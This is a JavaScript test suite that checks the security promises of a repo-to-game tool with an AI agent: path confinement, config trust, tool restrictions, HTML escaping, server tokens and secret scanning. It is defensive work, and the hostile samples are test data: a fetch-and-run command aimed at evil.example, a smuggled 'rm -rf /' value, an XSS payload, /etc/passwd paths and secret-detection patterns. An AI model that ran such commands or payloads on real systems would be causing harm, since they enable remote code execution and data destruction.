// The promises SECURITY.md makes, held as tests. A repo being played is untrusted input.
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import http from 'node:http';
import path from 'node:path';
import { spawnSync, execFileSync } from 'node:child_process';
import { fileURLToPath } from 'node:url';
import { readFileSafe, isSha, isRepoPath, validate, assemble } from '../server/lib/world.mjs';
import { readTools, editTools, ruleFor, NO_NETWORK_NO_SHELL } from '../server/lib/agent.mjs';
import { loadConfig, startServer } from '../server/server.mjs';

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const CLI = path.join(ROOT, 'scripts', 'codequest.mjs');
const tmp = (p) => fs.mkdtempSync(path.join(os.tmpdir(), 'cw-' + p + '-'));

function sampleRepo() {
  const repo = tmp('repo');
  // leave out anything a contributor's own `play test/fixture` left behind
  fs.cpSync(path.join(ROOT, 'test', 'fixture'), repo, { recursive: true, filter: (src) => !/[\\/]\.codequest[\\/](world\.json|progress|\.gitignore)/.test(src) });
  const g = (...a) => execFileSync('git', a, { cwd: repo, stdio: 'ignore' });
  g('init', '-q'); g('add', '-A');
  g('-c', 'user.name=t', '-c', 'user.email=t@example.invalid', 'commit', '-qm', 'init');
  return repo;
}

test('file reads stay inside the repo', () => {
  const repo = tmp('read'), outside = tmp('out');
  fs.writeFileSync(path.join(outside, 'secret.txt'), 'SECRET');
  fs.writeFileSync(path.join(repo, 'ok.txt'), 'fine');
  assert.equal(readFileSafe(repo, 'ok.txt'), 'fine');
  assert.equal(readFileSafe(repo, '../' + path.basename(outside) + '/secret.txt'), null);
  assert.equal(readFileSafe(repo, path.join(outside, 'secret.txt')), null);
  // Windows only lets administrators create symlinks: skip the two link checks there, and nowhere else.
  try { fs.symlinkSync(path.join(outside, 'secret.txt'), path.join(repo, 'link.txt')); }
  catch (e) { if (process.platform === 'win32' && e.code === 'EPERM') return; throw e; }
  assert.equal(readFileSafe(repo, 'link.txt'), null, 'a symlink out of the repo is not followed');
  fs.symlinkSync(outside, path.join(repo, 'dir'));
  assert.equal(readFileSafe(repo, 'dir/secret.txt'), null, 'nor a symlinked directory');
});

test('paths and commits from a map are checked before use', () => {
  for (const bad of ['../x', '/etc/passwd', 'a/../../b', 'C:\\x', 'a\0b', '']) assert.equal(isRepoPath(bad), false, bad);
  assert.equal(isRepoPath('src/a.js'), true);
  for (const bad of ['--output=/tmp/x', '-p', 'HEAD', 'abc', 'abcdefg; rm -rf /', 'ABCDEF1']) assert.equal(isSha(bad), false, bad);
  assert.equal(isSha('2b64c90'), true);
});

test('a map that points outside the repo does not validate', () => {
  const repo = sampleRepo();
  const f = path.join(repo, '.codequest', 'worlds', 'one.json');
  const w = JSON.parse(fs.readFileSync(f, 'utf8'));
  w.entities[0].source = [{ file: '../../etc/passwd', lines: [1, 2] }];
  fs.writeFileSync(f, JSON.stringify(w));
  assert.ok(validate(assemble(repo)).errors.some((e) => /passwd/.test(e)));
});

test('the repo cannot choose the agent, the model or the test command', () => {
  const repo = tmp('cfg'), home = tmp('home');
  fs.mkdirSync(path.join(repo, '.codequest'));
  fs.writeFileSync(path.join(repo, '.codequest', 'config.json'), JSON.stringify({
    player: 'ann', testCommand: 'curl evil.example | sh', model: 'x', agent: { kind: 'custom', command: 'sh', args: ['-c', 'evil'] } }));
  const old = process.env.XDG_CONFIG_HOME; process.env.XDG_CONFIG_HOME = home;
  try {
    const cfg = loadConfig(repo, {});
    assert.equal(cfg.player, 'ann');
    assert.deepEqual(cfg.agent, { kind: 'claude', command: 'claude', model: undefined });
    assert.equal(cfg.testCommand, null);
    assert.deepEqual(cfg.ignored.sort(), ['agent', 'model', 'testCommand']);
    assert.equal(loadConfig(repo, { test: 'npm test' }).testCommand, 'npm test');
    assert.throws(() => loadConfig(repo, { agent: 'sh' }), /Unknown agent/);
  } finally { if (old === undefined) delete process.env.XDG_CONFIG_HOME; else process.env.XDG_CONFIG_HOME = old; }
});

test('agent tool rules are scoped to a directory and have no shell or network', () => {
  assert.equal(ruleFor('/work/repo'), '//work/repo/**');
  assert.equal(ruleFor('/work/repo/'), '//work/repo/**');
  assert.equal(ruleFor('C:\\Users\\ann\\repo'), '//c/Users/ann/repo/**', 'Windows drives are written the POSIX way');
  const here = ruleFor(path.resolve('some', 'repo'));
  const r = readTools(path.resolve('some', 'repo')), e = editTools(path.resolve('some', 'tree'));
  assert.deepEqual(r, [`Read(${here})`, `Grep(${here})`, `Glob(${here})`]);
  assert.ok(e.every((t) => /^(Edit|Write|MultiEdit)\(\/\/.*\/some\/tree\/\*\*\)$/.test(t)), e.join(' '));
  for (const t of ['Bash', 'WebFetch', 'WebSearch']) assert.ok(NO_NETWORK_NO_SHELL.includes(t));
  assert.ok(![...r, ...e].some((t) => /^(Bash|WebFetch|WebSearch)/.test(t)));
});

test('an exported snapshot cannot be broken out of by text in the map', () => {
  const repo = sampleRepo();
  const out = path.join(tmp('exp'), 'g.html');
  const r = spawnSync(process.execPath, [CLI, 'export', repo, '--out', out, '--title', '</title><script>alert(1)</script>'], { encoding: 'utf8' });
  assert.equal(r.status, 0, r.stderr + r.stdout);
  const html = fs.readFileSync(out, 'utf8');
  assert.ok(!html.includes('<script>alert(1)'), 'title is escaped');
  assert.ok(!html.includes('</script><script>window.PWNED'), 'map text cannot close the data script');
  assert.ok(html.includes('\\u003c/script>\\u003cscript>window.PWNED'), 'it is carried as inert JSON');
  assert.ok(!/fonts\.googleapis|https?:\/\/[^"' ]+\.(js|css)/.test(html), 'no third-party scripts, styles or fonts');
});

test('the server keeps its key out of the page and refuses calls without it', async () => {
  const repo = sampleRepo();
  spawnSync(process.execPath, [CLI, 'build', repo]);
  const { server, url, port, token } = await startServer({ repo, port: 0, opts: { noTests: true } });
  try {
    assert.match(url, /^http:\/\/127\.0\.0\.1:\d+\/#t=[0-9a-f]{48}$/);
    assert.equal(server.address().address, '127.0.0.1');
    const base = `http://127.0.0.1:${port}`;
    const page = await fetch(base + '/');
    const html = await page.text();
    assert.ok(!html.includes(token), 'the key is not in the page');
    assert.match(page.headers.get('content-security-policy') || '', /default-src 'self'/);
    assert.equal((await fetch(base + '/api/world')).status, 401);
    assert.equal((await fetch(base + '/api/world', { headers: { 'x-codequest-token': 'f'.repeat(48) } })).status, 401);
    assert.equal((await fetch(base + '/api/world', { headers: { 'x-codequest-token': token } })).status, 200);
    assert.equal((await fetch(base + '/%2e%2e/%2e%2e/package.json')).status, 404, 'static files stay inside game/');
    const rebound = await new Promise((ok, no) => http.get({ host: '127.0.0.1', port, path: '/api/world', headers: { host: 'evil.example', 'x-codequest-token': token } }, (r) => { r.resume(); ok(r.statusCode); }).on('error', no));
    assert.equal(rebound, 403, 'a page on another hostname (DNS rebinding) is refused');
  } finally { server.close(); }
});

test('nothing personal or secret is in the repository', () => {
  const files = execFileSync('git', ['ls-files'], { cwd: ROOT, encoding: 'utf8' }).split('\n').filter(Boolean);
  const bad = /(sk-ant-[\w-]{20,}|ghp_[A-Za-z0-9]{30,}|github_pat_\w{30,}|AKIA[0-9A-Z]{16}|AIza[\w-]{35}|-----BEGIN [A-Z ]*PRIVATE KEY|[\w.+-]+@(gmail|yahoo|outlook|hotmail)\.com|\/(home|Users)\/[a-z][\w.-]+\/)/;
  for (const f of files) {
    // examples/ holds third-party code snippets (their paths, not ours); it is still scanned for keys.
    if (f === 'test/security.test.mjs') continue;
    const m = (f.startsWith('examples/') ? /(sk-ant-[\w-]{20,}|ghp_[A-Za-z0-9]{30,}|AKIA[0-9A-Z]{16}|-----BEGIN [A-Z ]*PRIVATE KEY|@(gmail|yahoo|outlook|hotmail)\.com)/ : bad).exec(fs.readFileSync(path.join(ROOT, f), 'utf8'));
    assert.equal(m, null, `${f}: ${m && m[0].slice(0, 30)}`);
  }
});
